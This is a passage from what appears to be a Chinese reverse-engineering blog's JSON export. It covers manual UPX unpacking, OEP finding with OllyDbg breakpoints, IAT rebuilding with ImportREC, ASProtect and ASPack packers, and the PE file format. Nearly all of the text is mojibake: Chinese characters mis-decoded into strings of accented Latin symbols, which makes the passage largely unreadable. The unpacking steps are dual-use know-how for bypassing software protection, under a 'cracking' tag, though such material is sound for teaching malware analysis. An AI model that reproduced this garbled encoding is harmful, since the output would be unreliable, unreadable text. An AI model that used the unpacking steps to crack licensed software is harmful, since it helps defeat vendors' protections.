å°¾éƒ¨å…¨0çš„æ•°æ®ä¸åˆ—å…¥è®¡ç®—ç†µçš„èŒƒå›´ã€‚iii. PEå¤´ä¸åˆ—å…¥è®¡ç®—ç†µçš„èŒƒå›´ã€‚2.åˆ†åˆ«è®¡ç®—æ¯ä¸€éƒ¨åˆ†æ•°æ®çš„ç†µEå’Œè¯¥éƒ¨åˆ†æ•°æ®å¤§å°Sã€‚3.ä»¥ä¸‹åˆ—å…¬å¼å¾—åˆ°æ•´ä¸ªPEæ–‡ä»¶çš„ç†µ Entropy = âˆ‘Ei * Si / âˆ‘Si (i = 1,2â€¦n)ã€‚ UPXæ‰‹åŠ¨è„±å£³æ ¹æ® æ ˆå¹³è¡¡åŸç† å¯»æ‰¾OEPåœ¨ç¼–å†™åŠ å£³è½¯ä»¶æ—¶ï¼Œå¿…é¡»ä¿è¯å¤–å£³åˆå§‹åŒ–çš„ç°åœºç¯å¢ƒï¼ˆå„å¯„å­˜å™¨å€¼ï¼‰ä¸åŸç¨‹åºçš„ç°åœºç¯å¢ƒç›¸åŒã€‚å› æ­¤ï¼ŒåŠ å£³ç¨‹åºåœ¨åˆå§‹åŒ–æ—¶ä¿å­˜å„å¯„å­˜å™¨çš„å€¼ï¼Œå¾…å¤–å£³æ‰§è¡Œå®Œæ¯•åæ¢å¤å¯„å­˜å™¨çš„å†…å®¹ï¼Œæœ€åè·³è½¬åˆ°åŸç¨‹åºæ‰§è¡Œã€‚é€šå¸¸ç”¨pushadï¼ˆpush eax/ecx/edx/ebx/esp/ebp/esi/ediï¼‰ã€popadæ¥ä¿å­˜å’Œæ¢å¤ç°åœºç¯å¢ƒã€‚é¦–å…ˆç”¨OllydbgåŠ è½½å·²åŠ å£³çš„ç¨‹åºï¼Œèµ·å§‹ä»£ç å¦‚ä¸‹ï¼šæ­¤æ—¶ç°åœºç¯å¢ƒï¼ˆå¯„å­˜å™¨å€¼ï¼‰å¦‚ä¸‹ï¼šåœ¨æ‰§è¡ŒpushadæŒ‡ä»¤åï¼Œå¯„å­˜å™¨çš„å€¼è¢«å‹å…¥æ ˆä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼šæ­¤æ—¶espæŒ‡å‘12FFA4hï¼Œå¯¹è¿™ä¸ªåœ°å€è®¾ç½®ç¡¬ä»¶è®¿é—®æ–­ç‚¹ï¼Œç„¶åè¿è¡Œç¨‹åºï¼Œåœ¨è°ƒç”¨popadæ¢å¤ç°åœºç¯å¢ƒæ—¶ä¼šè®¿é—®12FFA4hï¼Œé€ æˆä¸­æ–­ï¼Œæ­¤æ—¶ç¦»OEPå·²ç»ä¸è¿œäº†ï¼š1005B5155 .- E9 9506F4FF jmp carckUPX.004F57EF å³ä¸ºè·³è½¬åˆ°OEPçš„æŒ‡ä»¤ï¼Œè®¾ç½®æ–­ç‚¹ï¼Œè·Ÿè¿›åˆ°004F57EFï¼Œæ­¤æ—¶æˆ‘ä»¬å°±æ¥åˆ°äº†OEPã€‚dumpå’Œä¿®å¤IATè¡¨çš„å·¥å…·å¾ˆå¤šã€‚ ä½¿ç”¨Ollydumpè¿›è¡Œç¨‹åºè„±å£³å’ŒIATè¡¨ä¿®å¤ã€‚ä½¿ç”¨PEiDæ£€æŸ¥ï¼Œæœç„¶å£³å·²ç»è„±æ‰ï¼ ä½¿ç”¨PETools dumpå’ŒImport Reconstructä¿®å¤IATä½¿ç”¨PEToolså‡ºæ¥çš„ç¨‹åºä¸èƒ½è¿è¡Œï¼Œæç¤ºwin32æ— æ³•è¯†åˆ«ï¼Œè¿™æ˜¯å› ä¸ºIATè¡¨æ²¡æœ‰é‡å»ºã€‚ä½¿ç”¨Import Reconstructéœ€è¦çŸ¥é“IATè¡¨çš„èµ·å§‹ä½ç½®ã€‚æˆ‘ä»¬çŸ¥é“APIå‡½æ•°çš„è°ƒç”¨é€šå¸¸æ˜¯é€šè¿‡é—´æ¥è·³è½¬æˆ–è€…é—´æ¥CALLæ¥å®ç°çš„ã€‚å³JMP [XXXXXXX] or CALL [XXXXXX]ï¼Œè¿™æ ·æ˜¯ç›´æ¥è°ƒç”¨IATä¸­ä¿å­˜çš„APIå‡½æ•°åœ°å€ã€‚é¦–å…ˆï¼Œå®šä½åˆ°è·å–IATä¸­å‡½æ•°åœ°å€çš„è·³è½¬è¡¨,è¿™é‡Œå°±æ˜¯è¯¥ç¨‹åºå°†è¦è°ƒç”¨åˆ°çš„ä¸€äº›APIå‡½æ•°,æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™äº›è·³è½¬æŒ‡ä»¤çš„éƒ½æ˜¯ä»¥æœºå™¨ç FF 25å¼€å¤´çš„,æœ‰äº›æ•™ç¨‹é‡Œé¢è¯´ç›´æ¥æœç´¢äºŒè¿›åˆ¶FF 25å°±å¯ä»¥å¿«é€Ÿçš„å®šä½è¯¥è·³è¡¨ã€‚çœ‹åˆ°æ•´ä¸ªIATå,æˆ‘ä»¬ç›´æ¥ä¸‹æ‹‰åˆ°IATçš„å°¾éƒ¨,æˆ‘ä»¬çŸ¥é“å±äºåŒä¸€ä¸ªåŠ¨æ€åº“çš„APIå‡½æ•°åœ°å€éƒ½æ˜¯è¿ç»­å­˜æ”¾çš„,ä¸åŒçš„åŠ¨æ€åº“å‡½æ•°åœ°å€åˆ—è¡¨æ˜¯ç”¨é›¶éš”å¼€çš„ã€‚Import REConstructoré‡å»ºIATéœ€è¦ä¸‰é¡¹æŒ‡æ ‡:1)IATçš„èµ·å§‹åœ°å€,è¿™é‡Œæ˜¯403184,å‡å»æ˜ åƒåŸºå€400000å°±å¾—åˆ°äº†3184(RVA:ç›¸å¯¹è™šæ‹Ÿåœ°å€)ã€‚2)IATçš„å¤§å°IATçš„å¤§å° = 40328C - 403184 = 108(åå…­è¿›åˆ¶)3)OEP = 401000(è™šæ‹Ÿåœ°å€)- æ˜ åƒåŸºå€400000 = 1000(OEPçš„RVA)ã€‚ ASPackASPackæ˜¯ä¸€æ¬¾Win32å¯æ‰§è¡Œæ–‡ä»¶å‹ç¼©è½¯ä»¶ï¼Œå¯å‹ç¼©Win32å¯æ‰§è¡Œæ–‡ä»¶EXEã€DLLã€OCXï¼Œå…·æœ‰å¾ˆé«˜çš„å…¼å®¹æ€§å’Œç¨³å®šæ€§ã€‚ åŠ å¯†å£³åŠ å¯†å£³ç§ç±»è¾ƒå¤šï¼Œä¸€äº›å£³åªä¿æŠ¤ç¨‹åºï¼Œå¦ä¸€äº›å£³æä¾›é¢å¤–çš„åŠŸèƒ½å¦‚æ³¨å†Œã€ä½¿ç”¨æ¬¡æ•°ã€æ—¶é—´é™åˆ¶ã€‚è¶Šæœ‰åçš„åŠ å¯†å£³ï¼Œå…¶ç ´è§£å¯èƒ½æ€§è¶Šå¤§ã€‚ ASProtectè¿™ä¸ªå£³åœ¨packç•Œå½“é€‰è€å¤§æ˜¯æ¯«æ— å¼‚è®®çš„ï¼Œå½“ç„¶è¿™é‡Œçš„è€å¤§ä¸ä»…æŒ‡å®ƒçš„åŠ å¯†å¼ºåº¦ï¼Œè€Œæ˜¯åœ¨äºå®ƒå¼€åˆ›äº†å£³çš„æ–°æ—¶ä»£ï¼ŒSEH,BPMæ–­ç‚¹çš„æ¸…é™¤éƒ½å‡ºè‡ªè¿™é‡Œï¼Œæ›´ä¸ºæœ‰åçš„å½“å±RSAçš„ä½¿ç”¨ï¼Œä½¿å¾—Demoç‰ˆæ— æ³•è¢«crackæˆå®Œæ•´ç‰ˆæœ¬,code_dipsä¹Ÿæºäºè¿™é‡Œã€‚IATçš„å¤„ç†å³ä½¿åˆ°åˆ°ç°åœ¨çœ‹æ¥ä¹Ÿæ˜¯å¾ˆå¼ºçš„ã€‚ä»–çš„ç‰¹é•¿åœ¨äºå„ç§åŠ å¯†ç®—æ³•çš„è¿ç”¨ï¼Œè¿™ä¹Ÿæ˜¯å„ç§å£³è¦å­¦ä¹ çš„åœ°æ–¹ã€‚å®ƒå¯ä»¥å‹ç¼©ã€åŠ å¯†ã€åè·Ÿè¸ªä»£ç ã€CRCæ ¡éªŒå’ŒèŠ±æŒ‡ä»¤ç­‰ä¿æŠ¤æªæ–½ã€‚ä½¿ç”¨Blowfishã€Twofishã€TEAç­‰åŠ å¯†ç®—æ³•ï¼Œä»¥RSA1024ä¸ºæ³¨å†Œå¯†é’¥ç”Ÿæˆå™¨ï¼Œé€šè¿‡APIé’©å­ä¸åŠ å£³ç¨‹åºé€šä¿¡ã€‚ASProtectä¸ºè½¯ä»¶å¼€å‘äººå‘˜æä¾›äº†SDKï¼Œä»è€Œå®ç°äº†åŠ å¯†ç¨‹åºçš„å†…å¤–ç»“åˆã€‚ASProtect 1.xç³»åˆ—ï¼Œä½ç‰ˆæœ¬ç”¨Stripperå·¥å…·å¯è‡ªåŠ¨è„±å£³ã€‚ASProtectçš„SKEç³»åˆ—ä¸»è¦åœ¨protect OEPå’ŒSDKä¸Šé‡‡ç”¨äº†è™šæ‹ŸæœºæŠ€æœ¯ã€‚ åŠ å¯†åçš„ç‰¹å¾ å¯¼å…¥å‡½æ•°å¾ˆå°‘ ç¨‹åºçš„èŠ‚åä¸å†æ˜¯å…¸å‹çš„.text ä½¿ç”¨IDAæ‰“å¼€ï¼Œå‡ ä¹æ²¡æœ‰å¯è¯†åˆ«çš„ä»£ç  ä½¿ç”¨OllyDbgæ‰“å¼€ç¨‹åºï¼Œè¢«è­¦å‘Šè¯¥ç¨‹åºå·²åŠ å¯†ï¼ŒæŸ¥æ‰¾å‚è€ƒæ–‡æœ¬å­—ç¬¦ä¸²éƒ½æ˜¯ä¹±ç  ä½¿ç”¨PEiDæ£€æŸ¥å‡ºæ˜¯ASProtectåŠ å£³","categories":[{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://cool-y.github.io/categories/äºŒè¿›åˆ¶/"}],"tags":[{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://cool-y.github.io/tags/é€†å‘/"},{"name":"ç ´è§£","slug":"ç ´è§£","permalink":"https://cool-y.github.io/tags/ç ´è§£/"}]},{"title":"PEæ–‡ä»¶æ ¼å¼å­¦ä¹ ","slug":"PE-file","date":"2019-05-13T12:37:00.000Z","updated":"2021-04-10T13:46:18.806Z","comments":true,"path":"2019/05/13/PE-file/","link":"","permalink":"https://cool-y.github.io/2019/05/13/PE-file/","excerpt":"","text":"PEæ–‡ä»¶æ ¼å¼PE(Portable Executable)æ˜¯Win32å¹³å°ä¸‹å¯æ‰§è¡Œæ–‡ä»¶éµå®ˆçš„æ•°æ®æ ¼å¼ã€‚å¸¸è§çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå¦‚exeå’Œdllï¼‰éƒ½æ˜¯å…¸å‹çš„PEæ–‡ä»¶ã€‚PEæ–‡ä»¶æ ¼å¼å…¶å®æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼ŒåŒ…å«Windowsæ“ä½œç³»ç»ŸåŠ è½½ç®¡ç†å¯æ‰§è¡Œä»£ç æ—¶æ‰€å¿…è¦çš„ä¿¡æ¯ï¼Œå¦‚äºŒè¿›åˆ¶æœºå™¨ä»£ç ã€å­—ç¬¦ä¸²ã€èœå•ã€å›¾æ ‡ã€ä½å›¾ã€å­—ä½“ç­‰ã€‚PEæ–‡ä»¶æ ¼å¼è§„å®šäº†æ‰€æœ‰è¿™äº›ä¿¡æ¯åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­å¦‚ä½•ç»„ç»‡ã€‚åœ¨ç¨‹åºè¢«æ‰§è¡Œæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šæŒ‰ç…§PEæ–‡ä»¶æ ¼å¼çš„çº¦å®šå»ç›¸åº”åœ°æ–¹å‡†ç¡®å®šä½å„ç§ç±»å‹çš„èµ„æºï¼Œå¹¶åˆ†åˆ«è£…å…¥å†…å­˜çš„ä¸åŒåŒºåŸŸã€‚PEæ–‡ä»¶æ ¼å¼æŠŠå¯æ‰§è¡Œæ–‡ä»¶åˆ†æˆè‹¥å¹²ä¸ªæ•°æ®èŠ‚ï¼ˆsectionï¼‰ï¼Œä¸åŒèµ„æºè¢«å­˜æ”¾åœ¨ä¸åŒçš„èŠ‚ä¸­ï¼Œä¸€ä¸ªå…¸å‹çš„PEæ–‡ä»¶ä¸­åŒ…å«çš„èŠ‚å¦‚ä¸‹ï¼š .text ç”±ç¼–è¯‘å™¨äº§ç”Ÿï¼Œå­˜æ”¾ç€äºŒè¿›åˆ¶çš„æœºå™¨ä»£ç ï¼Œä¹Ÿæ˜¯åæ±‡ç¼–å’Œè°ƒè¯•çš„å¯¹è±¡ .data åˆå§‹åŒ–çš„æ•°æ®å—ï¼Œå¦‚å®å®šä¹‰ã€å…¨å±€å˜é‡ã€é™æ€å˜é‡ç­‰ .idata å¯æ‰§è¡Œæ–‡ä»¶æ‰€ä½¿ç”¨çš„åŠ¨æ€é“¾æ¥åº“ç­‰å¤–æ¥å‡½æ•°ä¸æ–‡ä»¶ä¿¡æ¯ .rsrc å­˜æ”¾ç¨‹åºçš„èµ„æºï¼Œå¦‚å›¾æ ‡ã€èœå•ç­‰é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å¯èƒ½æœ‰.reloc,.edata,.tls,.rdata 0x01 PEæ–‡ä»¶ä¸è™šæ‹Ÿå†…å­˜ä¹‹é—´çš„æ˜ å°„è™šæ‹Ÿå†…å­˜Windowsçš„å†…å­˜å¯ä»¥è¢«åˆ†ä¸ºä¸¤ä¸ªå±‚é¢ï¼šç‰©ç†å†…å­˜å’Œè™šæ‹Ÿå†…å­˜ã€‚å…¶ä¸­ï¼Œç‰©ç†å†…å­˜æ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦è¿›å…¥Windowså†…æ ¸çº§åˆ«ring0æ‰èƒ½çœ‹åˆ°ã€‚é€šå¸¸ï¼Œåœ¨ç”¨æˆ·æ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬ç”¨è°ƒè¯•å™¨çœ‹åˆ°çš„éƒ½æ˜¯è™šæ‹Ÿå†…å­˜ã€‚å¦‚æœæˆ‘ä»¬æŠŠè¿™çœ‹æˆé“¶è¡Œï¼Œé‚£ä¹ˆå°±å¾ˆå¥½ç†è§£äº†ã€‚ è¿›ç¨‹ç›¸å½“äºå‚¨æˆ· å†…å­˜ç®¡ç†å™¨ç›¸å½“äºé“¶è¡Œ ç‰©ç†å†…å­˜ç›¸å½“äºé’ç¥¨ è™šæ‹Ÿå†…å­˜ç›¸å½“äºå­˜æ¬¾ æ˜ å°„å…³ç³» åœ¨æ¼æ´æŒ–æ˜ä¸­,ç»å¸¸éœ€è¦çš„ä¸¤ç§æ“ä½œï¼š é™æ€åç¼–è¯‘å·¥å…·çœ‹åˆ°çš„æ˜¯PEæ–‡ä»¶ä¸­æŸæ¡æŒ‡ä»¤çš„ä½ç½®æ˜¯ç›¸å¯¹ä¸ç£ç›˜è€Œè¨€çš„ï¼Œå°±æ˜¯æ‰€è°“çš„ æ–‡ä»¶åç§» ï¼Œæˆ‘ä»¬å¯èƒ½è¿˜éœ€è¦çŸ¥é“è¿™æ¡æŒ‡ä»¤åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œè¿™ä¸ªä½ç½®å°±æ˜¯è™šæ‹Ÿå†…å­˜åœ°å€(VA) åè¿‡æ¥ï¼Œåœ¨è°ƒè¯•æ—¶çœ‹åˆ°çš„æŸæ¡æŒ‡ä»¤çš„åœ°å€æ˜¯ è™šæ‹Ÿå†…å­˜åœ°å€ï¼ˆVAï¼‰ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦å›åˆ°PEæ–‡ä»¶ä¸­æ‰¾åˆ°è¿™æ¡æŒ‡ä»¤å¯¹åº”çš„æœºå™¨ç  å‡ ä¸ªé‡è¦æ¦‚å¿µ æ–‡ä»¶åç§»åœ°å€(File Offset)ï¼šæ•°æ®åœ¨PEæ–‡ä»¶ä¸­çš„åœ°å€å«åšæ–‡ä»¶åç§»åœ°å€,å¯ä»¥ç†è§£ä¸ºå°±æ˜¯æ–‡ä»¶åœ°å€ã€‚è¿™æ˜¯æ–‡ä»¶åœ¨ç£ç›˜ä¸Šå­˜æ”¾ç›¸å¯¹ä¸æ–‡ä»¶å¼€å¤´çš„åç§»ã€‚ è£…è½½åŸºå€(Image Base):PEè£…å…¥å†…å­˜æ—¶çš„åŸºåœ°å€ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒEXEæ–‡ä»¶åœ¨å†…å­˜ä¸­å¯¹åº”çš„åŸºåœ°å€æ˜¯0x00400000,DLLæ–‡ä»¶æ˜¯0x10000000ã€‚è¿™äº›ä½ç½®å¯èƒ½é€šè¿‡ç¼–è¯‘é€‰é¡¹ä¿®æ”¹ è™šæ‹Ÿå†…å­˜åœ°å€(Virtual Address,VA )ï¼šPEæ–‡ä»¶ä¸­çš„æŒ‡ä»¤è£…å…¥å†…å­˜åçš„åœ°å€ã€‚ ç›¸å¯¹è™šæ‹Ÿåœ°å€(Relative Virtual Address, RVA)ï¼šç›¸å¯¹è™šæ‹Ÿåœ°å€æ˜¯å†…å­˜åœ°å€ç›¸å¯¹äºæ˜ å°„åŸºå€çš„åç§»é‡ã€‚ è™šæ‹Ÿå†…å­˜åœ°å€ï¼Œè£…è½½åŸºå€ï¼Œç›¸å¯¹è™šæ‹Ÿå†…å­˜åœ°å€ä¸‰è€…ä¹‹é—´çš„å…³ç³»: VA = Image Base + RVA æ–‡ä»¶åç§»åœ°å€ä¸ç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼šæ–‡ä»¶åç§»åœ°å€æ˜¯ç›¸å¯¹äºæ–‡ä»¶å¼€å§‹å¤„0å­—èŠ‚çš„åç§»,RVA(ç›¸å¯¹è™šæ‹Ÿåœ°å€)åˆ™æ˜¯ç›¸å¯¹äºè£…è½½åŸºå€0x00400000å¤„çš„åç§».ç”±äºæ“ä½œç³»ç»Ÿåœ¨è£…è½½æ—¶â€œåŸºæœ¬â€ä¸Šä¿æŒPEä¸­çš„æ•°æ®ç»“æ„ï¼Œæ‰€ä»¥æ–‡ä»¶åç§»åœ°å€å’ŒRVAæœ‰å¾ˆå¤§çš„ä¸€è‡´æ€§ã€‚ï¼ˆä¸æ˜¯å…¨éƒ¨ç›¸åŒï¼‰PEæ–‡ä»¶ä¸­çš„æ•°æ®æŒ‰ç…§ç£ç›˜æ•°æ®æ ‡å‡†å­˜æ”¾ï¼Œä»¥0x200ä¸ºåŸºæœ¬å•ä½è¿›è¡Œç»„ç»‡ã€‚å½“ä¸€ä¸ªæ•°æ®èŠ‚(stction)ä¸è¶³0x200å­—èŠ‚æ—¶ï¼Œä¸è¶³çš„åœ°æ–¹å°†ç”¨0x00å¡«å……ï¼Œå½“ä¸€ä¸ªæ•°æ®èŠ‚è¶…è¿‡0x200æ—¶ï¼Œä¸‹ä¸€ä¸ª0x200å—å°†åˆ†é…ç»™è¿™ä¸ªèŠ‚ä½¿ç”¨ã€‚æ‰€ä»¥PEæ•°æ®èŠ‚å¤§å°æ°¸è¿œæ˜¯0x200çš„æ•´æ•°å€å½“ä»£ç è£…å…¥åï¼Œå°†æŒ‰ç…§å†…å­˜æ•°æ®æ ‡å‡†å­˜æ”¾ï¼Œå¹¶ä»¥0x1000å­—èŠ‚ä¸ºåŸºæœ¬çš„å­˜å‚¨å•ä½è¿›è¡Œç»„ç»‡ï¼Œä¸è¶³å’Œè¶…è¿‡çš„æƒ…å†µç±»ä¼¼ä¸Šé¢ã€‚å› æ­¤ï¼Œå†…å­˜ä¸­çš„èŠ‚æ€»æ˜¯0x1000çš„æ•´å€æ•°ã€‚ç”±äºå†…å­˜ä¸­æ•°æ®èŠ‚ç›¸å¯¹äºè£…è½½åŸºå€çš„åç§»é‡å’Œæ–‡ä»¶ä¸­æ•°æ®èŠ‚çš„åç§»é‡æœ‰ä¸Šè¿°å·®å¼‚ï¼Œæ‰€ä»¥è¿›è¡Œæ–‡ä»¶åç§»åˆ°å†…å­˜åœ°å€ä¹‹é—´çš„æ¢ç®—æ—¶ï¼Œè¿˜è¦çœ‹æ‰€è½¬æ¢çš„åœ°å€ä½äºç¬¬å‡ ä¸ªèŠ‚å†…: æ–‡ä»¶åç§»åœ°å€ = è™šæ‹Ÿå†…å­˜åœ°å€(VA) - è£…è½½åŸºå€(Image Base) - èŠ‚åç§»â€‹ = RVA - èŠ‚åç§» å·¥å…·LordPE DLXå¢å¼ºç‰ˆ(2017..6.08)Resource Hacker 3.4.0PE viewer 0x02 é“¾æ¥åº“ä¸å‡½æ•°å¯¹äºä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºï¼Œå¯ä»¥æ”¶é›†åˆ°æœ€æœ‰ç”¨çš„ä¿¡æ¯å°±æ˜¯å¯¼å…¥è¡¨ã€‚å¯¼å…¥å‡½æ•°æ˜¯ç¨‹åºæ‰€ä½¿ç”¨çš„ä½†å­˜å‚¨åœ¨å¦ä¸€ç¨‹åºä¸­çš„é‚£äº›å‡½æ•°ã€‚é€šè¿‡å¯¼å…¥å‡½æ•°è¿æ¥ï¼Œä½¿å¾—ä¸å¿…é‡æ–°åœ¨å¤šä¸ªç¨‹åºä¸­é‡å¤å®ç°ç‰¹å®šåŠŸèƒ½ã€‚ é™æ€é“¾æ¥ã€è¿è¡Œæ—¶é“¾æ¥ä¸åŠ¨æ€é“¾æ¥ã€‚é™æ€é“¾æ¥ï¼šå½“ä¸€ä¸ªåº“è¢«é™æ€é“¾æ¥åˆ°å¯æ‰§è¡Œç¨‹åºæ—¶ï¼Œæ‰€æœ‰è¿™ä¸ªåº“ä¸­çš„ä»£ç éƒ½ä¼šè¢«å¤åˆ¶åˆ°å¯æ‰§è¡Œç¨‹åºä¸­ï¼Œè¿™ä½¿å¾—å¯æ‰§è¡Œç¨‹åºå¢å¤§è®¸å¤šï¼Œè€Œä¸”åœ¨åˆ†æä»£ç æ—¶ï¼Œå¾ˆéš¾åŒºåˆ†é™æ€é“¾æ¥çš„ä»£ç å’Œè‡ªèº«ä»£ç ã€‚è¿è¡Œæ—¶é“¾æ¥ï¼šåœ¨æ¶æ„ä»£ç ä¸­å¸¸ç”¨ï¼ˆåŠ å£³æˆ–æ··æ·†æ—¶ï¼‰ï¼Œåªæœ‰å½“éœ€è¦ä½¿ç”¨å‡½æ•°æ—¶ï¼Œæ‰é“¾æ¥åˆ°åº“ã€‚åŠ¨æ€é“¾æ¥ï¼šå½“ä»£ç è¢«åŠ¨æ€é“¾æ¥æ—¶ï¼Œå®¿ä¸»æ“ä½œç³»ç»Ÿä¼šåœ¨ç¨‹åºè£…è½½æ—¶æœç´¢æ‰€éœ€ä»£ç åº“ï¼Œå¦‚æœç¨‹åºè°ƒç”¨äº†è¢«é“¾æ¥çš„åº“å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šåœ¨ä»£ç åº“ä¸­æ‰§è¡Œã€‚LoadLibraryå’ŒGetProcAddresså…è®¸ä¸€ä¸ªç¨‹åºè®¿é—®ç³»ç»Ÿä¸Šä»»ä½•åº“ä¸­çš„å‡½æ•°ï¼Œå› æ­¤å½“å®ƒä»¬è¢«ä½¿ç”¨æ—¶ï¼Œæ— æ³•é™æ€åˆ†æå‡ºç¨‹åºä¼šé“¾æ¥å“ªäº›å‡½æ•°ã€‚PEæ–‡ä»¶å¤´å­˜å‚¨äº†æ¯ä¸ªå°†è¢«è£…è½½çš„åº“æ–‡ä»¶ï¼Œä»¥åŠæ¯ä¸ªä¼šè¢«ç¨‹åºä½¿ç”¨çš„å‡½æ•°ä¿¡æ¯ã€‚ å·¥å…·Dependency WalkerDependency Walker å¸¸è§dllç¨‹åºkernel32.dllkernel32.dllæ˜¯Windows 9x/Meä¸­éå¸¸é‡è¦çš„32ä½åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œå±äºå†…æ ¸çº§æ–‡ä»¶ã€‚å®ƒæ§åˆ¶ç€ç³»ç»Ÿçš„å†…å­˜ç®¡ç†ã€æ•°æ®çš„è¾“å…¥è¾“å‡ºæ“ä½œå’Œä¸­æ–­å¤„ç†ï¼Œå½“Windowså¯åŠ¨æ—¶ï¼Œkernel32.dllå°±é©»ç•™åœ¨å†…å­˜ä¸­ç‰¹å®šçš„å†™ä¿æŠ¤åŒºåŸŸï¼Œä½¿åˆ«çš„ç¨‹åºæ— æ³•å ç”¨è¿™ä¸ªå†…å­˜åŒºåŸŸã€‚user32.dlluser32.dllæ˜¯Windowsç”¨æˆ·ç•Œé¢ç›¸å…³åº”ç”¨ç¨‹åºæ¥å£ï¼Œç”¨äºåŒ…æ‹¬Windowså¤„ç†ï¼ŒåŸºæœ¬ç”¨æˆ·ç•Œé¢ç­‰ç‰¹æ€§ï¼Œå¦‚åˆ›å»ºçª—å£å’Œå‘é€æ¶ˆæ¯ã€‚åœ¨æ—©æœŸ32-bit ç‰ˆæœ¬çš„Windowsä¸­ï¼Œç”¨æˆ·æ§ä»¶æ˜¯åœ¨ComCtl32ä¸­å®ç°çš„ï¼Œä½†æ˜¯ä¸€äº›æ§ä»¶çš„æ˜¾ç¤ºåŠŸèƒ½æ˜¯åœ¨User32.dllä¸­å®ç°çš„ã€‚ä¾‹å¦‚åœ¨ä¸€ä¸ªçª—å£ä¸­éå®¢æˆ·åŒºåŸŸï¼ˆè¾¹æ¡†å’Œèœå•ï¼‰çš„ç»˜åˆ¶å°±æ˜¯ç”±User32.dllæ¥å®Œæˆçš„ã€‚User32.dll æ˜¯æ“ä½œç³»ç»Ÿçš„ä¸€ä¸ªæ ¸å¿ƒæ§ä»¶ï¼Œå®ƒå’Œæ“ä½œç³»ç»Ÿæ˜¯ç´§å¯†è”ç³»åœ¨ä¸€èµ·çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸åŒç‰ˆæœ¬çš„Windowsä¸­User32.dll æ˜¯ä¸åŒã€‚å› æ­¤ï¼Œåº”ç”¨ç¨‹åºåœ¨ä¸åŒç‰ˆæœ¬çš„Windowsä¸­è¿è¡Œçš„æ—¶å€™ï¼Œç”±äºUser32.dllçš„ä¸åŒï¼Œä¼šå¯¼è‡´åº”ç”¨ç¨‹åºçš„ç•Œé¢é€šå¸¸ä¼šæœ‰å¾®å°çš„ä¸åŒã€‚gdi32.dllgdi32.dllæ˜¯Windows GDIå›¾å½¢ç”¨æˆ·ç•Œé¢ç›¸å…³ç¨‹åºï¼ŒåŒ…å«çš„å‡½æ•°ç”¨æ¥ç»˜åˆ¶å›¾åƒå’Œæ˜¾ç¤ºæ–‡å­—comdlg32.dllcomdlg32.dllæ˜¯Windowsåº”ç”¨ç¨‹åºå…¬ç”¨å¯¹è¯æ¡†æ¨¡å—ï¼Œç”¨äºä¾‹å¦‚æ‰“å¼€æ–‡ä»¶å¯¹è¯æ¡†ã€‚advapi32.dlladvapi32.dllæ˜¯ä¸€ä¸ªé«˜çº§APIåº”ç”¨ç¨‹åºæ¥å£æœåŠ¡åº“çš„ä¸€éƒ¨åˆ†ï¼ŒåŒ…å«çš„å‡½æ•°ä¸å¯¹è±¡çš„å®‰å…¨æ€§ï¼Œæ³¨å†Œè¡¨çš„æ“æ§ä»¥åŠäº‹ä»¶æ—¥å¿—æœ‰å…³ã€‚shell32.dllshell32.dllæ˜¯Windowsçš„32ä½å¤–å£³åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œç”¨äºæ‰“å¼€ç½‘é¡µå’Œæ–‡ä»¶ï¼Œå»ºç«‹æ–‡ä»¶æ—¶çš„é»˜è®¤æ–‡ä»¶åçš„è®¾ç½®ç­‰å¤§é‡åŠŸèƒ½ã€‚ä¸¥æ ¼æ¥è®²ï¼Œå®ƒåªæ˜¯ä»£ç çš„åˆé›†ï¼ŒçœŸæ­£æ‰§è¡Œè¿™äº›åŠŸèƒ½çš„æ˜¯æ“ä½œç³»ç»Ÿçš„ç›¸å…³ç¨‹åºï¼Œdllæ–‡ä»¶åªæ˜¯æ ¹æ®è®¾ç½®è°ƒç”¨è¿™äº›ç¨‹åºçš„ç›¸å…³åŠŸèƒ½ç½¢äº†ã€‚ole32.dllole32.dllæ˜¯å¯¹è±¡é“¾æ¥å’ŒåµŒå…¥ç›¸å…³æ¨¡å—ã€‚odbc32.dllodbc32.dllæ˜¯ODBCæ•°æ®åº“æŸ¥è¯¢ç›¸å…³æ–‡ä»¶ã€‚ å¯¼å…¥å‡½æ•°ä¸å¯¼å‡ºå‡½æ•°å¯¼å…¥å‡½æ•°å’Œå¯¼å‡ºå‡½æ•°éƒ½æ˜¯ç”¨æ¥å’Œå…¶ä»–ç¨‹åºå’Œä»£ç è¿›è¡Œäº¤äº’æ—¶ä½¿ç”¨çš„ï¼Œé€šå¸¸ä¸€ä¸ªDLLä¼šå®ç°ä¸€ä¸ªæˆ–å¤šä¸ªåŠŸèƒ½å‡½æ•°ï¼Œç„¶åå°†ä»–ä»¬å¯¼å‡ºï¼Œä½¿å¾—åˆ«çš„ç¨‹åºå¯ä»¥å¯¼å…¥å¹¶ä½¿ç”¨è¿™äº›å‡½æ•°ï¼Œå¯¼å‡ºå‡½æ•°åœ¨DLLæ–‡ä»¶ä¸­æ˜¯æœ€å¸¸è§çš„ã€‚ 0x03 PEæ–‡ä»¶çš„ç»“æ„ PEæ–‡ä»¶ç»“æ„ MZæ–‡ä»¶å¤´ DOSæ’æ¡©ç¨‹åº å­—ä¸²â€œPE\\0\\0â€(4å­—èŠ‚) æ˜ åƒæ–‡ä»¶å¤´ å¯é€‰æ˜ åƒå¤´ Section table(èŠ‚è¡¨) Section 1 Section 2 â€¦.. 